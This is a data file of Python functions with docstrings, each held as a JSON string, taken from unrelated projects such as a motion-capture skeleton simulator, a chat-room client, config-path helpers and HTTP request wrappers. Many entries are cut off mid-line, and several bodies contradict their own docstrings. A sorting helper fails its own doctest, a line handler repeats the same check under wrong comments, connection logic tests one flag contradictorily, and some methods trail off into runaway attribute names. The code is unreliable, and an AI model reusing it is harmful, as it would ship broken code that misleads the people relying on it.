        "def get_body_indices(self, name, step=3):\n        \"\"\"Get a list of the indices for a specific body.\n\n        Parameters\n        ----------\n        name : str\n            The name of the body to look up.\n        step : int, optional\n            The number of numbers for each body. Defaults to 3, should be set\n            to 4 for body rotation (since quaternions have 4 values).\n\n        Returns\n        -------\n        list of int :\n            A list of the index values for quantities related to the named body.\n        \"\"\"\n        body = self.get_body(name)\n        return [body.get_index(i) for i in range(step)]",
        "def get_joint_separations(self):\n        \"\"\"Get the current joint separations for the skeleton.\n\n        Returns\n        -------\n        distances : list of float\n            A list expressing the distance between the two joint anchor points,\n            for each joint in the skeleton. These quantities describe how\n            \"exploded\" the bodies in the skeleton are; a value of 0 indicates\n            that the constraints are perfectly satisfied for that joint.\n        \"\"\"\n        distances = []\n        for joint in self.joints:\n            distances.append(joint.get_joint_separations())\n        return distances",
        "def enable_joint_motors(self, max_force=0.0):\n        \"\"\"Enable the joint motors in this skeleton.\n\n        This method sets the maximum force that can be applied by each joint to\n        attain the desired target velocities. It also enables torque feedback\n        for all joint motors.\n\n        Parameters\n        ----------\n        max_force : float\n            The maximum force that each joint is allowed to apply to attain its\n            target velocity.\n        \"\"\"\n        for joint in self.joints:\n            joint.enable_motors(max_force)\n            joint.enable_torque_feedback()",
        "def move_joints_to_target_angles(self, angles):\n        \"\"\"Move each joint toward a target angle.\n\n        This method uses a PID controller to set a target angular velocity for\n        each degree of freedom in the skeleton, based on the difference between\n        the current and the target angle for the respective DOF.\n\n        PID parameters are by default set to achieve a tiny bit less than\n        complete convergence in one time step, using only the P term (i.e., the\n        P coefficient is set to 1 - \\delta, while I and D coefficients are set\n        to 0). PID parameters can be updated by calling the `set_pid_params`\n        method.\n\n        Parameters\n        ----------\n        angles : list of float\n            A list of the target angles for every joint in the skeleton.\n        \"\"\"\n        # Set PID parameters\n        self.set_",
        "def add_torques(self, torques):\n        \"\"\"\n        Add torques for each degree of freedom in the skeleton.\n\n        Parameters\n        ----------\n        torques : list of float\n            A list of the torques to add to each degree of freedom in the\n            skeleton.\n        \"\"\"\n        for degree in range(self.degree):\n            self.add_torque(degree, torques[degree])",
        "def marker_labels(self):\n        \"\"\"Return the names of our marker labels in canonical order.\"\"\"\n        return sorted(\n            [\n                label.name\n                for label in self.markers\n                if label.name not in self.marker_labels_cache\n            ]\n        )",
        "def load_csv(self, filename):\n        \"\"\"\n        Load marker data from a CSV file.\n\n        The file will be imported using Pandas, which must be installed to use\n        this method. (``pip install pandas``)\n\n        The first line of the CSV file will be used for header information. The\n        \"time\" column will be used as the index for the data frame. There must\n        be columns named 'markerAB-foo-x','markerAB-foo-y','markerAB-foo-z', and\n        'markerAB-foo-c' for marker 'foo' to be included in the model.\n\n        Parameters\n        ----------\n        filename : str\n            Name of the CSV file to load.\n        \"\"\"\n        df = pd.read_csv(filename, header=None, index_col=0,\n                        names=['time', 'markerAB-foo-",
        "def load_c3d(self, filename, start_frame=0, max_frames=None):\n        \"\"\"Load marker data from a C3D file.\n\n        The file will be imported using the c3d module, which must be installed\n        to use this method. (``pip install c3d``)\n\n        Parameters\n        ----------\n        filename : str\n            Name of the C3D file to load.\n        start_frame : int, optional\n            Discard the first N frames. Defaults to 0.\n        max_frames : int, optional\n            Maximum number of frames to load. Defaults to loading all frames.\n        \"\"\"\n        if max_frames is None:\n            max_frames = self.max_frames\n        if start_frame < 0:\n            start_frame = 0\n        if start_frame > max_frames:\n            start_frame = max_",
        "def _process_data(self, data):\n        \"\"\"Process data to produce velocity and dropout information.\"\"\"\n        if self.dropout:\n            data = self.dropout(data)\n        if self.velocity:\n            data = self.velocity(data)\n        return data",
        "def _create_marker_bodies(self):\n        \"\"\"Create physics bodies corresponding to each marker in our data.\"\"\"\n        for marker in self.markers:\n            marker_bodies = []\n            for body in marker.bodies:\n                marker_bodies.append(self._create_marker_body(body))\n            marker.bodies = marker_bodies",
        "def load_from_text(cls, source, skeleton, axis=0, **kwargs):\n        \"\"\"\n        Load attachment configuration from the given text source.\n\n        The attachment configuration file has a simple format. After discarding\n        Unix-style comments (any part of a line that starts with the pound (#)\n        character), each line in the file is then expected to have the following\n        format::\n\n            marker-name body-name X Y Z\n\n        The marker name must correspond to an existing \"channel\" in our marker\n        data. The body name must correspond to a rigid body in the skeleton. The\n        X, Y, and Z coordinates specify the body-relative offsets where the\n        marker should be attached: 0 corresponds to the center of the body along\n        the given axis, while -1 and 1 correspond to the minimal (maximal,\n        respectively) extent of the body's",
        "def attach_marker_bodies(self, frame_no):\n        \"\"\"Attach marker bodies to the corresponding skeleton bodies.\n\n        Attachments are only made for markers that are not in a dropout state in\n        the given frame.\n\n        Parameters\n        ----------\n        frame_no : int\n            The frame of data we will use for attaching marker bodies.\n        \"\"\"\n        if self.dropout_state is not None:\n            return\n        for marker in self.markers:\n            marker_bodies = self.marker_bodies[marker]\n            if marker_bodies is not None:\n                marker_bodies.attach_to_frame(frame_no)",
        "def reposition_markers(self, frame_no):\n        \"\"\"Reposition markers to a specific frame of data.\n\n        Parameters\n        ----------\n        frame_no : int\n            The frame of data where we should reposition marker bodies. Markers\n            will be positioned in the appropriate places in world coordinates.\n            In addition, linear velocities of the markers will be set according\n            to the data as long as there are no dropouts in neighboring frames.\n        \"\"\"\n        # Get the markers in the frame\n        markers = self.markers[frame_no]\n        # Get the markers in the world coordinates\n        world_markers = self.world_markers[frame_no]\n        # Get the markers in the world coordinates\n        world_markers_in_world = self.world_markers_in_world[frame_no]\n        # Get the markers in the world coordinates\n",
        "def get_marker_distances(self):\n        \"\"\"Get a list of the distances between markers and their attachments.\n\n        Returns\n        -------\n        distances : ndarray of shape (num-markers, 3)\n            Array of distances for each marker joint in our attachment setup. If\n            a marker does not currently have an associated joint (e.g. because\n            it is not currently visible) this will contain NaN for that row.\n        \"\"\"\n        distances = np.zeros((self.num_markers, 3))\n        for i in range(self.num_markers):\n            marker = self.markers[i]\n            for j in range(marker.num_attachments):\n                attachment = marker.attachments[j]\n                if attachment.visible:\n                    distances[i, j] = np.linalg.norm(attachment.position - marker.position)\n        return distances",
        "def marker_springs_force(self, dx_tm1):\n        \"\"\"Return an array of the forces exerted by marker springs.\n\n        Notes\n        -----\n\n        The forces exerted by the marker springs can be approximated by::\n\n          F = kp * dx\n\n        where ``dx`` is the current array of marker distances. An even more\n        accurate value is computed by approximating the velocity of the spring\n        displacement::\n\n          F = kp * dx + kd * (dx - dx_tm1) / dt\n\n        where ``dx_tm1`` is an array of distances from the previous time step.\n\n        Parameters\n        ----------\n        dx_tm1 : ndarray\n            An array of distances from markers to their attachment targets,\n            measured at the previous time step.\n\n        Returns\n        -------\n        F : ndarray",
        "def create_skeleton(self, filename, pid_params=None):\n        \"\"\"\n        Create and configure a skeleton in our model.\n\n        Parameters\n        ----------\n        filename : str\n            The name of a file containing skeleton configuration data.\n        pid_params : dict, optional\n            If given, use this dictionary to set the PID controller\n            parameters on each joint in the skeleton. See\n            :func:`pagoda.skeleton.pid` for more information.\n        \"\"\"\n        self.skeleton = self.model.create_skeleton(filename, pid_params)",
        "def load_markers(self, filename, attachments=None, max_frames=None):\n        \"\"\"\n        Load marker data and attachment preferences into the model.\n\n        Parameters\n        ----------\n        filename : str\n            The name of a file containing marker data. This currently needs to\n            be either a .C3D or a .CSV file. CSV files must adhere to a fairly\n            strict column naming convention; see :func:`Markers.load_csv` for\n            more information.\n        attachments : str\n            The name of a text file specifying how markers are attached to\n            skeleton bodies.\n        max_frames : number, optional\n            Only read in this many frames of marker data. By default, the entire\n            data file is read into memory.\n\n        Returns\n        -------\n        markers : :class:`Markers`\n            Returns a markers object containing loaded marker data as well as\n",
        "def step(self, dt):\n        \"\"\"Advance the physics world by one step.\n\n        Typically this is called as part of a :class:`pagoda.viewer.Viewer`, but\n        it can also be called manually (or some other stepping mechanism\n        entirely can be used).\n\n        \"\"\"\n        self.world.step(dt)\n        self.world.update()",
        "def settle_markers(self, frame_no=0, max_distance=0.1, max_iters=1000,\n                       states=None):\n        \"\"\"Settle the skeleton to our marker data at a specific frame.\n\n        Parameters\n        ----------\n        frame_no : int, optional\n            Settle the skeleton to marker data at this frame. Defaults to 0.\n        max_distance : float, optional\n            The settling process will stop when the mean marker distance falls\n            below this threshold. Defaults to 0.1m (10cm). Setting this too\n            small prevents the settling process from finishing (it will loop\n            indefinitely), and setting it too large prevents the skeleton from\n            settling to a stable state near the markers.\n        max_iters : int, optional\n            Attempt to settle markers for at most this many iterations. Defaults\n            to 1000.\n",
        "def marker_data(self, start=0, end=None, states=None):\n        \"\"\"Iterate over a set of marker data, dragging its skeleton along.\n\n        Parameters\n        ----------\n        start : int, optional\n            Start following marker data after this frame. Defaults to 0.\n        end : int, optional\n            Stop following marker data after this frame. Defaults to the end of\n            the marker data.\n        states : list of body states, optional\n            If given, set the states of the skeleton bodies to these values\n            before starting to follow the marker data.\n        \"\"\"\n        if end is None:\n            end = self.marker_data_length\n        if start is None:\n            start = 0\n        if states is None:\n            states = []\n        for i in range(start, end + 1):\n            yield self.marker_data_at(i, states",
        "def update(self, frame_no, dt=None):\n        \"\"\"Update the simulator to a specific frame of marker data.\n\n        This method returns a generator of body states for the skeleton! This\n        generator must be exhausted (e.g., by consuming this call in a for loop)\n        for the simulator to work properly.\n\n        This process involves the following steps:\n\n        - Move the markers to their new location:\n          - Detach from the skeleton\n          - Update marker locations\n          - Reattach to the skeleton\n        - Detect ODE collisions\n        - Yield the states of the bodies in the skeleton\n        - Advance the ODE world one step\n\n        Parameters\n        ----------\n        frame_no : int\n            Step to this frame of marker data.\n        dt : float, optional\n            Step with this time duration. Defaults to ``self.dt``.\n\n       ",
        "def follow_marker_data(self, start=0, end=None, states=None, max_force=20.0):\n        \"\"\"Follow a set of marker data, yielding kinematic joint angles.\n\n        Parameters\n        ----------\n        start : int, optional\n            Start following marker data after this frame. Defaults to 0.\n        end : int, optional\n            Stop following marker data after this frame. Defaults to the end of\n            the marker data.\n        states : list of body states, optional\n            If given, set the states of the skeleton bodies to these values\n            before starting to follow the marker data.\n        max_force : float, optional\n            Allow each degree of freedom in the skeleton to exert at most this\n            force when attempting to maintain its equilibrium position. This\n            defaults to 20N. Set this value higher to simulate a stiff skeleton\n",
        "def follow_angle_data(self, angles, start=0, end=None, states=None,\n                          max_force=100.0, **kwargs):\n        \"\"\"Follow a set of angle data, yielding dynamic joint torques.\n\n        Parameters\n        ----------\n        angles : ndarray (num-frames x num-dofs)\n            Follow angle data provided by this array of angle values.\n        start : int, optional\n            Start following angle data after this frame. Defaults to the start\n            of the angle data.\n        end : int, optional\n            Stop following angle data after this frame. Defaults to the end of\n            the angle data.\n        states : list of body states, optional\n            If given, set the states of the skeleton bodies to these values\n            before starting to follow the marker data.\n        max_force : float, optional\n            Allow each degree of freedom in the",
        "def move_body(self, torque_data):\n        \"\"\"Move the body according to a set of torque data.\"\"\"\n        self.body.position = self.body.position + torque_data['position']\n        self.body.velocity = self.body.velocity + torque_data['velocity']",
        "def resorted(values):\n    \"\"\"Sort values, but put numbers after alphabetically sorted words.\n\n    This function is here to make outputs diff-compatible with Aleph.\n\n    Example::\n        >>> sorted([\"b\", \"1\", \"a\"])\n        ['1', 'a', 'b']\n        >>> resorted([\"b\", \"1\", \"a\"])\n        ['a', 'b', '1']\n\n    Args:\n        values (iterable): any iterable object/list/tuple/whatever.\n\n    Returns:\n        list of sorted values, but with numbers after words\n\n    \"\"\"\n    return sorted(\n        values,\n        key=lambda x: (len(x), x.lower()),\n        reverse=True\n    )",
        "def draw(self):\n        \"\"\"Draw all bodies in the world.\"\"\"\n        for body in self.world.bodies:\n            body.draw()",
        "def get_stream(self, error_callback=None, live=False):\n        \"\"\"Get room stream to listen for messages.\n\n        Kwargs:\n            error_callback (func): Callback to call when an error occurred (parameters: exception)\n            live (bool): If True, issue a live stream, otherwise an offline stream\n\n        Returns:\n            :class:`Stream`. Stream\n        \"\"\"\n        if live:\n            return LiveStream(self, error_callback)\n        else:\n            return Stream(self, error_callback)",
        "def get_users(self, sort=False):\n        \"\"\"Get list of users in the room.\n\n        Kwargs:\n            sort (bool): If True, sort rooms by name\n\n        Returns:\n            array. List of users\n        \"\"\"\n        if sort:\n            return self.room.get_users_sorted()\n        return self.room.get_users()",
        "def set_room_name(self, name):\n        \"\"\"Set the room name.\n\n        Args:\n            name (str): Name\n\n        Returns:\n            bool. Success\n        \"\"\"\n        return self.api_call(\n            ENDPOINTS['rooms']['set'],\n            dict(name=name)\n        )",
        "def set_room_topic(self, topic):\n        \"\"\"Set the room topic.\n\n        Args:\n            topic (str): Topic\n\n        Returns:\n            bool. Success\n        \"\"\"\n        return self.api_call(\n            ENDPOINTS['rooms']['topic'],\n            dict(room_id=self.room_id, topic=topic)\n        )",
        "def post(self, message):\n        \"\"\"Post a message.\n\n        Args:\n            message (:class:`Message` or string): Message\n\n        Returns:\n            bool. Success\n        \"\"\"\n        if isinstance(message, Message):\n            message = message.to_json()\n        return self._post(self.api_url, message)",
        "def get_config_dirs(self):\n        \"\"\"\n        Returns a list of paths specified by the XDG_CONFIG_DIRS environment\n        variable or the appropriate default.\n\n        The list is sorted by precedence, with the most important item coming\n        *last* (required by the existing config_resolver logic).\n        \"\"\"\n        config_dirs = os.environ.get('XDG_CONFIG_DIRS', None)\n        if not config_dirs:\n            config_dirs = self.default_config_dirs\n        return sorted(config_dirs)",
        "def get_xdg_config_home(self):\n        \"\"\"\n        Returns the value specified in the XDG_CONFIG_HOME environment variable\n        or the appropriate default.\n        \"\"\"\n        xdg_config_home = os.environ.get('XDG_CONFIG_HOME')\n        if xdg_config_home is None:\n            xdg_config_home = self.get_default_xdg_config_home()\n        return xdg_config_home",
        "def get_filename(self):\n        \"\"\"\n        Returns the filename which is effectively used by the application. If\n        overridden by an environment variable, it will return that filename.\n        \"\"\"\n        filename = os.environ.get('FLASK_FILENAME', None)\n        if filename is None:\n            filename = os.path.basename(self.path)\n        return filename",
        "def check_read_permission(self, filename):\n        \"\"\"\n        Check if ``filename`` can be read. Will return boolean which is True if\n        the file can be read, False otherwise.\n        \"\"\"\n        if not os.access(filename, os.R_OK):\n            raise IOError(\"File %s is not readable\" % filename)\n        return True",
        "def load(self, reload=False, require_load=False):\n        \"\"\"\n        Searches for an appropriate config file. If found, loads the file into\n        the current instance. This method can also be used to reload a\n        configuration. Note that you may want to set ``reload`` to ``True`` to\n        clear the configuration before loading in that case.  Without doing\n        that, values will remain available even if they have been removed from\n        the config files.\n\n        :param reload: if set to ``True``, the existing values are cleared\n                       before reloading.\n        :param require_load: If set to ``True`` this will raise a\n                             :py:exc:`IOError` if no config file has been found\n                             to load.\n        \"\"\"\n        if require_load:\n            if not self.config_file:\n                raise IOError(\"No config file found",
        "def get_styles(self):\n        \"\"\"Get styles.\"\"\"\n        styles = []\n        for style in self.styles:\n            styles.append(style.get_style())\n        return styles",
        "def create(cls, settings):\n        \"\"\"Create a connection with given settings.\n\n        Args:\n            settings (dict): A dictionary of settings\n\n        Returns:\n            :class:`Connection`. The connection\n        \"\"\"\n        return cls(\n            settings['host'],\n            settings['port'],\n            settings['user'],\n            settings['password'],\n            settings['database'],\n            settings['ssl'],\n            settings['ssl_verify'],\n            settings['ssl_cert'],\n            settings['ssl_keyfile'],\n            settings['ssl_cert_reqs'],\n            settings['ssl_cipher'],\n            settings['ssl_version'],\n            ssl_version=settings['ssl_version'],\n        )",
        "def put(self, url, post_data, parse_data=False, key=None, parameters=None):\n        \"\"\"Issue a PUT request.\n\n        Kwargs:\n            url (str): Destination URL\n            post_data (dict): Dictionary of parameter and values\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n\n        Returns:\n            dict. Response (a dict with keys: success, data, info, body)\n        \n        Raises:\n            AuthenticationError, ConnectionError, urllib2.HTTPError, ValueError, Exception\n        \"\"\"\n        if parse_data:\n            post_data = self._parse_data(post_data)\n        if key:\n            post_data[key] = self._get_",
        "def post(self, url, post_data, parse_data=False, key=None, parameters=None, listener=None):\n        \"\"\"Issue a POST request.\n\n        Kwargs:\n            url (str): Destination URL\n            post_data (dict): Dictionary of parameter and values\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n            listener (func): callback called when uploading a file\n\n        Returns:\n            dict. Response (a dict with keys: success, data, info, body)\n        \n        Raises:\n            AuthenticationError, ConnectionError, urllib2.HTTPError, ValueError, Exception\n        \"\"\"\n        if parse_data:\n            post_data = self._parse_data(post_data)\n       ",
        "def get(self, url, parse_data=False, key=None, parameters=None):\n        \"\"\"Issue a GET request.\n\n        Kwargs:\n            url (str): Destination URL\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n\n        Returns:\n            dict. Response (a dict with keys: success, data, info, body)\n\n        Raises:\n            AuthenticationError, ConnectionError, urllib2.HTTPError, ValueError, Exception\n        \"\"\"\n        if parse_data:\n            data = self._get_data(url, key, parameters)\n        else:\n            data = self._get_data(url, None, parameters)\n        return self._parse_response(data)",
        "def headers(self):\n        \"\"\"Get headers.\n\n        Returns:\n            tuple: Headers\n        \"\"\"\n        headers = self._headers\n        if headers is None:\n            headers = self._headers = Headers(self.request)\n        return headers",
        "def get_auth_url(self):\n        \"\"\"Get URL used for authentication\n\n        Returns:\n            string: URL\n        \"\"\"\n        if self.auth_url:\n            return self.auth_url\n        else:\n            return self.get_base_url()",
        "def parse(self, text, key=None):\n        \"\"\"Parses a response.\n\n        Args:\n            text (str): Text to parse\n\n        Kwargs:\n            key (str): Key to look for, if any\n\n        Returns:\n            Parsed value\n\n        Raises:\n            ValueError\n        \"\"\"\n        if key is None:\n            key = self.key\n\n        if not isinstance(text, str):\n            raise ValueError('Text must be a string')\n\n        if not text:\n            return None\n\n        if self.key:\n            if key in self.data:\n                return self.data[key]\n            else:\n                raise ValueError('Key %s not found' % key)\n        else:\n            return self.data.get(text, None)",
        "def request(self, method=None, url=None, extra_headers=None, body_producer=None, full_url=False):\n        \"\"\"\n        Build a request for twisted\n\n        Args:\n            method (str): Request method (GET/POST/PUT/DELETE/etc.) If not specified, it will be POST if post_data is not None\n            url (str): Destination URL (full, or relative)\n\n        Kwargs:\n            extra_headers (dict): Headers (override default connection headers, if any)\n            body_producer (:class:`twisted.web.iweb.IBodyProducer`): Object producing request body\n            full_url (bool): If False, URL is relative\n\n        Returns:\n            tuple. Tuple with two elements: reactor, and request\n        \"\"\"\n        if method is None:\n            method = 'POST'\n       ",
        "def request(self, method=None, url=None, post_data=None, parse_data=False, key=None, parameters=None, listener=None, full_return=False):\n        \"\"\"Issue a request.\n\n        Args:\n            method (str): Request method (GET/POST/PUT/DELETE/etc.) If not specified, it will be POST if post_data is not None\n\n        Kwargs:\n            url (str): Destination URL\n            post_data (str): A string of what to POST\n            parse_data (bool): If true, parse response data\n            key (string): If parse_data==True, look for this key when parsing data\n            parameters (dict): Additional GET parameters to append to the URL\n            listener (func): callback called when uploading a file\n            full_return (bool): If set to True, get a full response (with success,",
        "def _build_url(self, url, parameters=None):\n        \"\"\"Build destination URL.\n\n        Kwargs:\n            url (str): Destination URL\n            parameters (dict): Additional GET parameters to append to the URL\n\n        Returns:\n            str. URL\n        \"\"\"\n        if not parameters:\n            parameters = {}\n        url = url.format(**parameters)\n        return url",
        "def is_text(self):\n        \"\"\"Tells if this message is a text message.\n\n        Returns:\n            bool. Success\n        \"\"\"\n        if self.type == MessageType.TEXT:\n            return True\n        if self.type == MessageType.IMAGE:\n            return self.data.startswith(b'<')\n        return False",
        "def get_rooms(self, sort=False):\n        \"\"\"Get rooms list.\n\n        Kwargs:\n            sort (bool): If True, sort rooms by name\n\n        Returns:\n            array. List of rooms (each room is a dict)\n        \"\"\"\n        rooms = []\n        for room in self.rooms:\n            if sort:\n                rooms.append(room.name)\n            else:\n                rooms.append(room)\n        return rooms",
        "def get_room(self, name):\n        \"\"\"Get a room by name.\n\n        Returns:\n            :class:`Room`. Room\n\n        Raises:\n            RoomNotFoundException\n        \"\"\"\n        if name not in self.rooms:\n            raise RoomNotFoundException(name)\n        return self.rooms[name]",
        "def get_room(self):\n        \"\"\"Get room.\n\n        Returns:\n            :class:`Room`. Room\n        \"\"\"\n        if self._room is None:\n            self._room = Room(self._client, self.room_id)\n        return self._room",
        "def get_user(self):\n        \"\"\"Get user.\n\n        Returns:\n            :class:`User`. User\n        \"\"\"\n        if self._user is None:\n            self._user = User(self.client, self.id)\n        return self._user",
        "def search(self, terms):\n        \"\"\"Search transcripts.\n\n        Args:\n            terms (str): Terms for search\n\n        Returns:\n            array. Messages\n        \"\"\"\n        return self.client.search(self.id, terms)",
        "def add_observer(self, observer):\n        \"\"\"Attach an observer.\n\n        Args:\n            observer (func): A function to be called when new messages arrive\n\n        Returns:\n            :class:`Stream`. Current instance to allow chaining\n        \"\"\"\n        if observer is None:\n            raise ValueError('Observer function cannot be None')\n        self._observers.append(observer)\n        return self",
        "def _on_incoming_messages(self, messages):\n        \"\"\"Called when incoming messages arrive.\n\n        Args:\n            messages (tuple): Messages (each message is a dict)\n        \"\"\"\n        for message in messages:\n            if message.get('type') == 'message':\n                self._on_message(message)",
        "def fetch_messages(self):\n        \"\"\"Fetch new messages.\"\"\"\n        self.log.debug('Fetching messages')\n        self.messages = self.client.messages(\n            self.channel,\n            self.message_limit,\n            self.message_offset,\n        )",
        "def _on_messages(self, messages):\n        \"\"\"Called when new messages arrive.\n\n        Args:\n            messages (tuple): Messages\n        \"\"\"\n        for message in messages:\n            if message.type == MessageType.MESSAGE:\n                self._on_message(message)",
        "def _send_headers(self, headers):\n        \"\"\"Called when a connection is made, and used to send out headers\"\"\"\n        if self.connection is not None:\n            self.connection.sendall(headers)",
        "def _lineReceived(self, line):\n        \"\"\"\n        Callback issued by twisted when new line arrives.\n\n        Args:\n            line (str): Incoming line\n        \"\"\"\n        # Ignore empty lines\n        if not line:\n            return\n\n        # Ignore comments\n        if line.startswith('#'):\n            return\n\n        # Ignore empty lines\n        if line.startswith(' '):\n            return\n\n        # Ignore lines with leading whitespace\n        if line.startswith(' '):\n            return\n\n        # Ignore lines with leading whitespace\n        if line.startswith(' '):\n            return\n\n        # Ignore lines with leading whitespace\n        if line.startswith(' '):\n            return\n\n        # Ignore lines with leading whitespace\n        if line.startswith(' '):\n            return\n\n        # Ignore lines with leading whitespace\n        if line.starts",
        "def _process_data(self, data):\n        \"\"\"Process data.\n\n        Args:\n            data (str): Incoming data\n        \"\"\"\n        if not data:\n            return\n\n        if self.is_closing:\n            return\n\n        if self.is_closing:\n            self.is_closing = True\n            self.logger.debug('Closing connection')\n            self.close()\n            return\n\n        if self.is_closing:\n            self.logger.debug('Closing connection')\n            self.is_closing = False\n            self.logger.debug('Received data: %s', data)\n            self.socket.send(data)\n            return\n\n        if self.is_closing:\n            self.logger.debug('Received data: %s', data)\n            self.socket.send(data)\n            return\n\n        if self.is",
        "def get_styles(self):\n        \"\"\"Get a dictionary of CSL styles.\"\"\"\n        styles = {}\n        for style in self.styles:\n            styles[style.name] = style.value\n        return styles",
        "def start_producing(self, consumer):\n        \"\"\"Start producing.\n\n        Args:\n            consumer: Consumer\n        \"\"\"\n        self.producer = consumer\n        self.producer.start()",
        "def stop(self, forced=False):\n        \"\"\"Cleanup code after asked to stop producing.\n\n        Kwargs:\n            forced (bool): If True, we were forced to stop\n        \"\"\"\n        if forced:\n            self.stop_forced()\n        else:\n            self.stop_running()",
        "def send_block(self, block):\n        \"\"\"Send a block of bytes to the consumer.\n\n        Args:\n            block (str): Block of bytes\n        \"\"\"\n        if not block:\n            return\n        self.send_message(block)\n        self.consumer.send_message(block)",
        "def length(self):\n        \"\"\"Returns total length for this request.\n\n        Returns:\n            int. Length\n        \"\"\"\n        if self._length is None:\n            self._length = self._request.get_content_length()\n        return self._length",
        "def _build_headers(self):\n        \"\"\"Build headers for each field.\"\"\"\n        for field in self.fields:\n            if field.name in self.headers:\n                continue\n            field_name = field.name\n            field_type = field.type\n            field_description = field.description\n            field_label = field.label\n            field_help = field.help\n            field_help_text = field.help_text\n            field_help_text_html = field.help_text_html\n            field_help_text_markdown = field.help_text_markdown\n            field_help_text_markdown_html = field.help_text_markdown_html\n            field_help_text_markdown_markdown = field.help_text_markdown_markdown\n            field_help_text_markdown_markdown_html = field.help_text_markdown_markdown_",
        "def get_file_size(self, field):\n        \"\"\"\n        Returns the file size for given file field.\n\n        Args:\n            field (str): File field\n\n        Returns:\n            int. File size\n        \"\"\"\n        if field not in self.fields:\n            raise ValueError('File field %s not found' % field)\n\n        return self.fields[field]['size']",
        "def _generate_path_value(result_type):\n    \"\"\"Generate a path value of type result_type.\n\n    result_type can either be bytes or text_type\n    \"\"\"\n    if isinstance(result_type, text_type):\n        return result_type\n    elif isinstance(result_type, bytes_type):\n        return result_type.decode('utf-8')\n    else:\n        raise TypeError('Invalid result type: %s' % result_type)",
        "def _path_from_ascii(ascii_str, type_):\n    \"\"\"Given an ASCII str, returns a path of the given type.\"\"\"\n    if type_ == 'dir':\n        return os.path.join(os.path.sep, ascii_str)\n    elif type_ == 'file':\n        return os.path.join(os.path.sep, ascii_str)\n    else:\n        raise ValueError('Unknown type: %s' % type_)",
        "def _generate_root(self, path):\n        \"\"\"Generates a root component for a path.\"\"\"\n        if path.startswith('/'):\n            path = path[1:]\n        return self._generate_component(path, self.root)",
        "def generate_filesystem_path_values(allow_pathlike=None):\n    \"\"\"A strategy which generates filesystem path values.\n\n    The generated values include everything which the builtin\n    :func:`python:open` function accepts i.e. which won't lead to\n    :exc:`ValueError` or :exc:`TypeError` being raised.\n\n    Note that the range of the returned values depends on the operating\n    system, the Python version, and the filesystem encoding as returned by\n    :func:`sys.getfilesystemencoding`.\n\n    :param allow_pathlike:\n        If :obj:`python:None` makes the strategy include objects implementing\n        the :class:`python:os.PathLike` interface when Python >= 3.6 is used.\n        If :obj:`python:False` no pathlike objects will be generated. If\n        :obj:`python:True` pathlike will be generated (",
        "def exec_code(self, code, *args, **kwargs):\n        \"\"\"exec compiled code\"\"\"\n        self.code = code\n        self.args = args\n        self.kwargs = kwargs\n        self.executed = True\n        self.executed_code = self.exec_code_wrapper(code, *args, **kwargs)",
        "def replace_blocks(self, extends):\n        \"\"\"replace all blocks in extends with current blocks\"\"\"\n        for block in extends:\n            self.replace_block(block)",
        "def flush(self):\n        \"\"\"flush all buffered string into code\"\"\"\n        if self.buffer:\n            self.code.append(self.buffer)\n            self.buffer = []",
        "def add_post_data(self, data):\n        \"\"\"Add POST data.\n\n        Args:\n            data (dict): key => value dictionary\n        \"\"\"\n        for key, value in data.items():\n            self.add_post_data_item(key, value)",
        "def log_error(self, text):\n        \"\"\"\n        Given some error text it will log the text if self.log_errors is True\n\n        :param text: Error text to log\n        \"\"\"\n        if self.log_errors:\n            if self.log_errors_level == 'debug':\n                print(text)\n            else:\n                print(text, file=sys.stderr)",
        "def process_texts(self, texts, retry_count=0):\n        \"\"\"Processes the texts using TweeboParse and returns them in CoNLL format.\n\n        :param texts: The List of Strings to be processed by TweeboParse.\n        :param retry_count: The number of times it has retried for. Default\n                            0 does not require setting, main purpose is for\n                            recursion.\n        :return: A list of CoNLL formated strings.\n        :raises ServerError: Caused when the server is not running.\n        :raises :py:class:`requests.exceptions.HTTPError`: Caused when the\n                input texts is not formated correctly e.g. When you give it a\n                String not a list of Strings.\n        :raises :py:class:`json.JSONDecodeError`: Caused if after self.retries\n                attempts to parse the data it",
        "def set_data(self, data, datetime_fields=None):\n        \"\"\"Set entity data\n\n        Args:\n            data (dict): Entity data\n            datetime_fields (array): Fields that should be parsed as datetimes\n        \"\"\"\n        if datetime_fields is None:\n            datetime_fields = []\n        for field in datetime_fields:\n            if field in data:\n                data[field] = parse_datetime(data[field])\n        self.data = data",
        "def validate(self, text):\n        \"\"\"validates XML text\"\"\"\n        try:\n            self.root = ET.fromstring(text)\n        except ET.ParseError as e:\n            raise InvalidXMLError(e)\n        self.validate_root()",
        "def validate_name(self, name):\n        \"\"\"validates XML name\"\"\"\n        if not name:\n            raise ValueError(\"name cannot be empty\")\n        if not re.match(r'^[a-zA-Z0-9_-]+$', name):\n            raise ValueError(\"name must be a valid XML name\")\n        return name",
        "def start(self):\n        \"\"\"\n        Prepare the actors, the world, and the messaging system to begin \n        playing the game.\n        \n        This method is guaranteed to be called exactly once upon entering the \n        game stage.\n        \"\"\"\n        self.actor_system = ActorSystem(self.actor_factory)\n        self.world = World(self.actor_system)\n        self.messaging_system = MessagingSystem(self.actor_system)\n        self.actor_system.start()\n        self.world.start()\n        self.messaging_system.start()",
        "def update(self):\n        \"\"\"Sequentially update the actors, the world, and the messaging system.  \n        The theater terminates once all of the actors indicate that they are done.\n        \"\"\"\n        while not self.shutdown:\n            try:\n                self.actor_system.update()\n                self.world_system.update()\n                self.messaging_system.update()\n            except KeyboardInterrupt:\n                self.shutdown = True\n                break",
        "def end(self):\n        \"\"\"\n        Give the actors, the world, and the messaging system a chance to react \n        to the end of the game.\n        \"\"\"\n        self.world.end()\n        self.messaging.end()\n        self.actor_system.end()",
        "def _template_vars(self):\n        \"\"\"Template variables.\"\"\"\n        return {\n            'app': self.app,\n            'app_name': self.app_name,\n            'app_version': self.app_version,\n            'app_url': self.app_url,\n            'app_url_prefix': self.app_url_prefix,\n            'app_url_suffix': self.app_url_suffix,\n            'app_url_prefix_css': self.app_url_prefix_css,\n            'app_url_suffix_css': self.app_url_suffix_css,\n            'app_url_prefix_js': self.app_url_prefix_js,\n            'app_url_suffix_js': self.app_url_suffix_js,\n            'app_url_prefix_img': self.app",
